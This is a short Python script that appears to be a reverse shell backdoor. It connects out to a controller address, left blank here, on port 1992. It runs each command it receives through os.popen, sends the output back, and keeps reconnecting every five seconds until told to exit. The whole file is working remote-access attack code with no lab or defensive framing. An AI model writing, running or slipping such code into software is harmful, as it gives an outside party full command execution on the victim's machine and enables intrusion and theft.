from socket import *
import os
import time


IP=""
#we will try all time until the server up
def func():
    while True:
        try:
            client = socket(AF_INET,SOCK_STREAM)
            client.connect((IP,1992))
            while True:
                res=""
                data= client.recv(2048).decode()
                if data=="exit":
                    client.close()
                    return None
                #we will excute the command
                res=os.popen(data).read()
                client.sendall(res.encode())
        except:
            print("Error")
            time.sleep(5)
func()